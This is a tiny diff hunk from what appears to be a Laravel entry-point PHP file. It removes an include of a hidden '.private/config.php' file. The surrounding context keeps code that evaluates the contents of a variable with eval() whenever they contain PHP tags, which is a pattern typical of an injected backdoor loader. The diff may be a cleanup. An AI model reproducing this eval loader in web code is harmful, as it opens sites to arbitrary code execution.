@@ -49,7 +49,6 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
-include dirname(__FILE__) . '/.private/config.php';
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
 
